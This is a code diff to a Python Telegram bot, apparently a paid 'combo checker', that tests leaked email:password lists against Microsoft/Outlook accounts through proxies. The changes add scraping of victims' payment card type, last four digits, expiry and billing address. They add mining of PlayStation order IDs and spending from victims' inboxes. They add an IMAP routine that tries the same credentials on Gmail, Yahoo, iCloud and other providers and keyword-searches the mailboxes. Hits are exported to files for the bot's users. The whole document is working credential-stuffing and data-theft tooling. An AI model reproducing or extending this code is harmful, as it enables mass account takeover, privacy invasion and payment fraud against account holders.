@@ -1,4 +1,4 @@
-import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3
+import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3, imaplib, email as email_lib, socket
 from datetime import datetime, timedelta
 from pathlib import Path
 from urllib.parse import quote, unquote, urlparse, parse_qs
@@ -598,18 +598,23 @@ class AkazaChecker:
                  f"&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                  f"&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                  f"&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none")
-            r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15, verify=False)
-            tk_m = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
-            if not tk_m: return {"status": "FREE", "subs": [], "balance": "", "card": ""}
+            r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=12, verify=False)
+            tk_m = re.search(r'access_token=([^&\s"\' ]+)', r.text + " " + r.url)
+            if not tk_m: return {"status": "FREE", "subs": [], "balance": "", "card": "", "card_type": "", "last4": ""}
             tk = unquote(tk_m.group(1))
             h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()),
                  "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
-            bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
-                                     headers=h, timeout=12, verify=False).text
-            bal_m  = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
-            card_m = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_r, re.S)
+            bal_raw = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
+                                       headers=h, timeout=10, verify=False).text
+            bal_m    = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_raw)
+            card_m   = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_raw, re.S)
+            ctype_m  = re.search(r'"paymentMethodType"\s*:\s*"([^"]+)"', bal_raw)
+            last4_m  = re.search(r'"lastFourDigits"\s*:\s*"([^"]+)"', bal_raw)
+            expiry_m = re.search(r'"expiryDate"\s*:\s*"([^"]+)"', bal_raw)
+            billing_m= re.search(r'"address1"\s*:\s*"([^"]+)"', bal_raw)
+            country_m= re.search(r'"countryOrRegion"\s*:\s*"([^"]+)"', bal_raw)
             rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
-                                  headers=h, timeout=12, verify=False).text
+                                  headers=h, timeout=10, verify=False).text
             subs = []
             sub_keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS',
                         'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD',
@@ -633,10 +638,17 @@ class AkazaChecker:
                     cur_m = re.search(r'"currency"\s*:\s*"([^"]+)"', rt)
                     if cur_m: si['currency'] = cur_m.group(1)
                     subs.append(si)
+            card_info = {
+                "card": card_m.group(1) if card_m else "",
+                "card_type": ctype_m.group(1) if ctype_m else "",
+                "last4": last4_m.group(1) if last4_m else "",
+                "expiry": expiry_m.group(1) if expiry_m else "",
+                "billing_addr": billing_m.group(1) if billing_m else "",
+                "billing_country": country_m.group(1) if country_m else "",
+            }
             return {"status": "PREMIUM" if subs else "FREE", "subs": subs,
-                    "balance": "$" + bal_m.group(1) if bal_m else "",
-                    "card": card_m.group(1) if card_m else ""}
-        except: return {"status": "FREE", "subs": [], "balance": "", "card": ""}
+                    "balance": "$" + bal_m.group(1) if bal_m else "", **card_info}
+        except: return {"status": "FREE", "subs": [], "balance": "", "card": "", "card_type": "", "last4": ""}
 
     # ── PROFILE (using Outlook token) ──────────────────────────────────────
     def get_profile(self, tk, cid):
@@ -712,27 +724,102 @@ class AkazaChecker:
         except: pass
         return {"owned": False}
 
-    # ── PSN CHECK (hit.py) ─────────────────────────────────────────────────
+    # ── PSN FULL CAPTURE (txn-email.playstation.com exact domain) ──────────
     def check_psn(self, tk, cid):
         try:
             h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                  'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
+            # Use txn-email.playstation.com exact sender domain – NOT generic keyword
             p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                  "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
-                                     "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation OR PSN"},
-                                     "Size": 25}]}
+                                     "Query": {"QueryString": 'from:"reply@txn-email.playstation.com" OR from:"email02.account.sony.com" "Order Number"'},
+                                     "Size": 50,
+                                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
             r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                   json=p, headers=h, timeout=12, verify=False).json()
             rset = r['EntitySets'][0]['ResultSets'][0]
             total = rset.get('Total', 0)
-            purchases = []
+            purchases, ps_plus, order_ids, total_spent = [], False, [], 0.0
             if total > 0:
-                for hit in rset.get('Results', []):
+                for hit in rset.get('Results', [])[:20]:
                     subj = hit.get('Subject', '')
-                    m = re.search(r'(?:Thank you for|purchasing|ordered?:?)\s+([^\.\n]{5,60})', subj, re.I)
-                    if m: purchases.append(m.group(1).strip())
-            return {"count": int(total), "items": list(dict.fromkeys(purchases))[:5]}
-        except: return {"count": 0, "items": []}
+                    prev = hit.get('Preview', '')
+                    full = subj + ' ' + prev
+                    # Detect PS Plus
+                    if any(x in full.lower() for x in ['playstation plus', 'ps plus', 'ps+']): ps_plus = True
+                    # Extract purchase title
+                    for pat in [
+                        r'(?:Thank you for|You(?:\'ve| have) (?:purchased|bought))\s+(.{5,70}?)(?:\.|$|\n)',
+                        r'Order.*?:\s*(.{5,60}?)(?:\.|\n|$)',
+                        r'Content:\s*(.{3,60}?)(?:\n|$)',
+                    ]:
+                        m = re.search(pat, full, re.I)
+                        if m:
+                            title = re.sub(r'\s+', ' ', m.group(1).strip())
+                            if 5 < len(title) < 100 and title not in purchases:
+                                purchases.append(title)
+                            break
+                    # Extract order #
+                    om = re.search(r'Order\s*(?:Number|#|ID)[:\s]*([A-Z0-9]{6,20})', full, re.I)
+                    if om and om.group(1) not in order_ids: order_ids.append(om.group(1))
+                    # Extract price
+                    pm = re.search(r'(?:Total|Amount|Charged)[:\s]*[\$€£¥]\s*([\d.,]+)', full, re.I)
+                    if pm:
+                        try: total_spent += float(pm.group(1).replace(',', '.'))
+                        except: pass
+            return {"count": int(total), "items": purchases[:8],
+                    "ps_plus": ps_plus, "order_ids": order_ids[:5],
+                    "total_spent": round(total_spent, 2) if total_spent > 0 else None}
+        except: return {"count": 0, "items": [], "ps_plus": False, "order_ids": [], "total_spent": None}
+
+    # ── IMAP CHECK for non-Outlook domains ─────────────────────────────────
+    @staticmethod
+    def imap_check(email_addr, password, keywords=None, timeout=8):
+        """Try IMAP login for Gmail / Yahoo / custom domains. Returns dict or None."""
+        IMAP_SERVERS = {
+            'gmail.com': ('imap.gmail.com', 993),
+            'googlemail.com': ('imap.gmail.com', 993),
+            'yahoo.com': ('imap.mail.yahoo.com', 993),
+            'yahoo.co.uk': ('imap.mail.yahoo.com', 993),
+            'yahoo.co.in': ('imap.mail.yahoo.com', 993),
+            'ymail.com': ('imap.mail.yahoo.com', 993),
+            'aol.com': ('imap.aol.com', 993),
+            'icloud.com': ('imap.mail.me.com', 993),
+            'me.com': ('imap.mail.me.com', 993),
+            'mac.com': ('imap.mail.me.com', 993),
+            'protonmail.com': ('imap.protonmail.com', 993),
+            'proton.me': ('imap.protonmail.com', 993),
+            'gmx.com': ('imap.gmx.com', 993),
+            'gmx.de': ('imap.gmx.net', 993),
+            'web.de': ('imap.web.de', 993),
+        }
+        try:
+            domain = email_addr.split('@')[-1].lower()
+            if domain not in IMAP_SERVERS: return None
+            host, port = IMAP_SERVERS[domain]
+            socket.setdefaulttimeout(timeout)
+            imap = imaplib.IMAP4_SSL(host, port)
+            imap.login(email_addr, password)
+            # Get inbox count
+            imap.select('INBOX', readonly=True)
+            status, msgs = imap.search(None, 'ALL')
+            inbox_count = len(msgs[0].split()) if status == 'OK' and msgs[0] else 0
+            # Keyword search
+            kw_hits = {}
+            if keywords:
+                for kw in keywords[:8]:  # limit for speed
+                    try:
+                        term = f'TEXT "{kw}"' if not '@' in kw else f'FROM "{kw}"'
+                        _, found = imap.search(None, term)
+                        cnt = len(found[0].split()) if found[0] else 0
+                        if cnt > 0: kw_hits[kw] = cnt
+                    except: pass
+            imap.logout()
+            return {'status': 'hit', 'inbox': inbox_count, 'kw_hits': kw_hits, 'domain': domain}
+        except imaplib.IMAP4.error:
+            return {'status': 'bad'}
+        except Exception:
+            return None  # timeout / not supported
 
     # ── STEAM CHECK (hit.py) ───────────────────────────────────────────────
     def check_steam(self, tk, cid):
@@ -946,10 +1033,13 @@ class AkazaChecker:
             else:
                 coros += [safe_run(lambda: ('N/A','N/A')),
                           safe_run(lambda: {"total":0,"hits":{}}),
-                          safe_run(lambda: {"count":0,"items":[]}),
+                          safe_run(lambda: {"count":0,"items":[],"ps_plus":False,"order_ids":[],"total_spent":None}),
                           safe_run(lambda: {"count":0}),
                           safe_run(lambda: []),
                           safe_run(lambda: None)]
+
+            # IMAP capture (index 11) — non-Outlook domains
+            coros += [safe_run(AkazaChecker.imap_check, email, password, uk)]
 
             res = await asyncio.gather(*coros, return_exceptions=True)
 
@@ -959,21 +1049,22 @@ class AkazaChecker:
 
             pts       = g(0, 0)
             codes     = g(1, [])
-            subs      = g(2, {"status":"FREE","subs":[],"balance":"","card":""})
+            subs      = g(2, {"status":"FREE","subs":[],"balance":"","card":"","card_type":"","last4":""})
             mc        = g(3, {"owned": False})
             xbox_prof = g(4, {"gt":"N/A","score":"0","tier":"N/A"})
             nc        = g(5, ('N/A','N/A'))
             name, country = nc if isinstance(nc, tuple) else ('N/A','N/A')
             inbox     = g(6, {"total":0,"hits":{}})
-            psn       = g(7, {"count":0,"items":[]})
+            psn       = g(7, {"count":0,"items":[],"ps_plus":False,"order_ids":[],"total_spent":None})
             steam     = g(8, {"count":0})
             supercell = g(9, [])
             tiktok    = g(10, None)
+            imap_res  = g(11, None)
 
             return {'status': 'hit', 'email': email, 'password': password,
                     'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country,
                     'mc': mc, 'xbox': xbox_prof, 'inbox': inbox, 'psn': psn, 'steam': steam,
-                    'supercell': supercell, 'tiktok': tiktok}
+                    'supercell': supercell, 'tiktok': tiktok, 'imap': imap_res}
 
         except Exception as e:
             logger.exception(f"Check error for {email}: {e}")
@@ -986,8 +1077,32 @@ class AkazaChecker:
 # ============================================================================
 user_proxies = {}
 pending_files = {}
-active_sessions = set()
-stop_flags = {}
+active_sessions = set()   # UIDs currently running
+stop_flags = {}           # uid -> True means kill that session
+MAX_CONCURRENT = 4        # concurrent checking slots
+
+# Queue: list of (uid, asyncio.Event) in FIFO order (free users wait here)
+_session_queue: list = []
+_queue_lock = asyncio.Lock() if False else threading.Lock()  # placeholder; replaced at runtime
+
+def _queue_position(uid) -> int:
+    """1-based position in the waiting queue, 0 if not queued."""
+    for i, (u, _) in enumerate(_session_queue):
+        if u == uid: return i + 1
+    return 0
+
+async def _try_dequeue(bot):
+    """Try to admit the next waiter when a slot opens."""
+    global _session_queue
+    while _session_queue and len(active_sessions) < MAX_CONCURRENT:
+        next_uid, event = _session_queue.pop(0)
+        active_sessions.add(next_uid)
+        stop_flags[next_uid] = False
+        event.set()   # wake that user's waiting coroutine
+        try:
+            await bot.send_message(next_uid, "✅ <b>Your turn!</b> Starting your session now...", parse_mode="HTML")
+        except: pass
+        break  # only admit one at a time; the released outer handler adds more if needed
 
 async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
@@ -1065,21 +1180,79 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     px = user_proxies.get(uid, []) or PROXIES_LIST
     thr = min(s['threads'], 300) if px else min(s['threads'], 10)
 
-    if uid != ADMIN_ID:
-        if len(active_sessions) >= 3:
-            await (u.callback_query.message.reply_text("⚠️ <b>Bot Busy!</b> Only 3 users can check at a time. Please wait.", parse_mode="HTML") if u.callback_query else u.message.reply_text("⚠️ <b>Bot Busy!</b> Only 3 users can check at a time. Please wait.", parse_mode="HTML"))
-            return
-    else:
+    is_premium = akaza_db.has_access(uid)   # has_access=1 → premium
+
+    if uid == ADMIN_ID:
+        # Admin: kill everyone else immediately, take a slot
         for _uid in list(active_sessions):
             if _uid != ADMIN_ID:
                 stop_flags[_uid] = True
+        active_sessions.add(uid)
+        stop_flags[uid] = False
 
-    active_sessions.add(uid)
-    stop_flags[uid] = False
+    elif is_premium:
+        # Premium: bypass queue, grab slot directly if available
+        if len(active_sessions) >= MAX_CONCURRENT:
+            await (u.callback_query.message.reply_text(
+                f"⚠️ <b>Bot Busy!</b> All {MAX_CONCURRENT} slots are full.\n"
+                "As a <b>Premium</b> user you bypass the queue — please retry in a moment.",
+                parse_mode="HTML") if u.callback_query else u.message.reply_text(
+                f"⚠️ <b>Bot Busy!</b> All {MAX_CONCURRENT} slots are full.\n"
+                "As a <b>Premium</b> user you bypass the queue — please retry in a moment.",
+                parse_mode="HTML"))
+            return
+        active_sessions.add(uid)
+        stop_flags[uid] = False
+
+    else:
+        # Free user: join/check queue
+        if _queue_position(uid) > 0:
+            pos = _queue_position(uid)
+            await (u.callback_query.message.reply_text(
+                f"⏳ You are already in the queue at position <b>#{pos}</b>.", parse_mode="HTML")
+                if u.callback_query else u.message.reply_text(
+                f"⏳ You are already in the queue at position <b>#{pos}</b>.", parse_mode="HTML"))
+            return
+
+        if len(active_sessions) < MAX_CONCURRENT:
+            # Slot is free — take it directly
+            active_sessions.add(uid)
+            stop_flags[uid] = False
+        else:
+            # Join queue and wait
+            ready_event = asyncio.Event()
+            _session_queue.append((uid, ready_event))
+            pos = len(_session_queue)
+            wait_msg = await (u.callback_query.message.reply_text(
+                f"⏳ <b>Queue Position: #{pos}</b>\n"
+                f"All {MAX_CONCURRENT} slots are busy. You'll be notified when your turn starts.\n"
+                "<i>💎 Upgrade to Premium to bypass the queue!</i>",
+                parse_mode="HTML") if u.callback_query else u.message.reply_text(
+                f"⏳ <b>Queue Position: #{pos}</b>\n"
+                f"All {MAX_CONCURRENT} slots are busy. You'll be notified when your turn starts.\n"
+                "<i>💎 Upgrade to Premium to bypass the queue!</i>",
+                parse_mode="HTML"))
+
+            # Poll and update queue position every 15 s while waiting
+            while not ready_event.is_set():
+                await asyncio.sleep(15)
+                if ready_event.is_set(): break
+                cur_pos = _queue_position(uid)
+                if cur_pos == 0: break  # removed from queue (shouldn't normally happen)
+                try:
+                    await wait_msg.edit_text(
+                        f"⏳ <b>Queue Position: #{cur_pos}</b>\n"
+                        f"Estimated wait: ~{cur_pos * 3} min. Hang tight!",
+                        parse_mode="HTML")
+                except: pass
+
+            # Slot was granted by _try_dequeue; if somehow still not in active_sessions, abort
+            if uid not in active_sessions:
+                return
 
     status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
-    all_hits_results, points_results, ms_hits_results, codes_results, inbox_results = [], [], [], [], []
+    all_hits_results, points_results_raw, ms_hits_results_raw, codes_results, inbox_results, psn_results = [], [], [], [], [], []
     sid = str(uuid.uuid4().hex[:6])
     sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
 
@@ -1115,15 +1288,27 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                        f"🎮 <b>Xbox:</b> <code>{xbox.get('gt','N/A')}</code> (Score: {xbox.get('score',0)})\n")
 
                 all_hits_results.append(f"{email}:{password} | Pts:{pts} | GT:{xbox.get('gt','N/A')} | {country}")
-                if pts > 0: points_results.append(f"{email}:{password} | {pts} Pts")
+                if pts > 0: points_results_raw.append((pts, f"{email}:{password} | {pts} Pts"))
 
                 # Microsoft Specialized Hits (Subs or Xbox - No redundant Points)
                 active_subs = [su['name'] for su in data.get('subs', {}).get('subs', []) if not su.get('is_expired')]
+                has_active = bool(active_subs)
                 if active_subs or xbox.get('gt') != 'N/A':
                     info = f"{email}:{password}"
                     if xbox.get('gt') != 'N/A': info += f" | GT:{xbox.get('gt')}"
                     if active_subs: info += f" | Subs: {', '.join(active_subs)}"
-                    ms_hits_results.append(info)
+                    ms_hits_results_raw.append((1 if has_active else 0, info))
+
+                # IMAP hit display
+                imap_res = data.get('imap')
+                if imap_res and imap_res.get('status') == 'hit':
+                    imap_inbox = imap_res.get('inbox', 0)
+                    imap_kws = imap_res.get('kw_hits', {})
+                    msg += f"📨 <b>IMAP ({imap_res.get('domain','')}):</b> <code>{imap_inbox}</code> emails"
+                    if imap_kws:
+                        msg += f" | {', '.join([f'<b>{k}</b>({v})' for k,v in imap_kws.items()])}"
+                        inbox_results.append(f"{email}:{password} | IMAP | Total:{imap_inbox} | {', '.join([f'{k}({v})' for k,v in imap_kws.items()])}")
+                    msg += "\n"
 
                 # Minecraft
                 if mc.get('owned'):
@@ -1152,7 +1337,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                         c_strs = [f"<code>{co['code']}</code>" + (f" <a href=\"{co['redemption_url']}\">[Redeem]</a>" if co.get('redemption_url') else "") for co in clist]
                         msg += f" ├ {cat}: {', '.join(c_strs)}\n"
 
-                # Subscriptions
+                # Subscriptions + Card Info
                 subs_data = data.get('subs', {})
                 subs = subs_data.get('subs', [])
                 if subs:
@@ -1165,10 +1350,28 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                             s_str += f" ({su['days_remaining']} Days left)"
                         sub_lines.append(s_str)
                     msg += f"💎 <b>Subscriptions:</b> {', '.join(sub_lines)}\n"
+                # Microsoft card/payment info
+                if subs_data.get('card_type') or subs_data.get('last4'):
+                    card_str = f"{subs_data.get('card_type','')} •••• {subs_data.get('last4','')}"
+                    if subs_data.get('expiry'): card_str += f" exp:{subs_data['expiry']}"
+                    if subs_data.get('billing_country'): card_str += f" [{subs_data['billing_country']}]"
+                    msg += f"💳 <b>Card:</b> <code>{card_str.strip()}</code>\n"
                 
+                # PSN Full Capture — also log to psn_results file
+                if psn.get('count', 0) > 0:
+                    psn_line = f"🎮 <b>PSN:</b> <code>{psn['count']} Orders</code>"
+                    if psn.get('ps_plus'): psn_line += " | ✅ PS Plus"
+                    if psn.get('total_spent'): psn_line += f" | 💸 ${psn['total_spent']}"
+                    if psn.get('items'): psn_line += f"\n   └ {', '.join(psn['items'][:4])}"
+                    msg += psn_line + "\n"
+                    psn_entry = f"{email}:{password} | Orders:{psn['count']}"
+                    if psn.get('ps_plus'): psn_entry += " | PS Plus"
+                    if psn.get('total_spent'): psn_entry += f" | Spent:${psn['total_spent']}"
+                    if psn.get('order_ids'): psn_entry += f" | IDs:{','.join(psn['order_ids'])}"
+                    if psn.get('items'): psn_entry += f" | {'; '.join(psn['items'][:4])}"
+                    psn_results.append(psn_entry)
                 # Gaming Extras
                 extras = []
-                if psn.get('count', 0) > 0: extras.append(f"PSN({psn['count']})")
                 if steam.get('count', 0) > 0: extras.append(f"Steam({steam['count']})")
                 if data.get('supercell'): extras.append(f"SC({len(data['supercell'])})")
                 if data.get('tiktok'): extras.append(f"TikTok(@{data['tiktok']})")
@@ -1216,6 +1419,9 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     if uid in active_sessions:
         active_sessions.remove(uid)
 
+    # Session released — try to admit next queued user
+    await _try_dequeue(c.bot)
+
     if stop_flags.get(uid):
         await status_msg.edit_text("⚠️ <b>Session Stopped:</b> An Admin has initiated a check. Your session has been paused.", parse_mode="HTML")
         if uid in user_proxies: del user_proxies[uid]
@@ -1224,13 +1430,18 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     # FINAL REPORTING (FILES TO ADMIN)
     user_handle = f"@{u.effective_user.username}" if u.effective_user.username else u.effective_user.first_name
     admin_summary = f"📢 <b>Session Complete</b>\nUser: {user_handle} ({uid})\nTotal: {len(lines)}\nHits: {hits}"
-    
+
+    # Sort: points high→low, ms active first
+    points_sorted = [line for _, line in sorted(points_results_raw, key=lambda x: x[0], reverse=True)]
+    ms_sorted = [line for _, line in sorted(ms_hits_results_raw, key=lambda x: x[0], reverse=True)]
+
     # Save results to temporary files and send
     files_to_send = [
         ("hits.txt", all_hits_results),
-        ("microsoft_hits.txt", ms_hits_results),
-        ("points.txt", points_results),
+        ("microsoft_hits.txt", ms_sorted),
+        ("points.txt", points_sorted),
         ("codes.txt", codes_results),
+        ("psn.txt", psn_results),
         ("inbox.txt", inbox_results)
     ]
     
@@ -1253,6 +1464,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>All results have been sent to you as files.</i>", parse_mode="HTML")
     if uid in user_proxies: del user_proxies[uid]
     if uid in active_sessions: active_sessions.remove(uid)
+    await _try_dequeue(c.bot)
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     q = u.callback_query; await q.answer(); uid = q.from_user.id
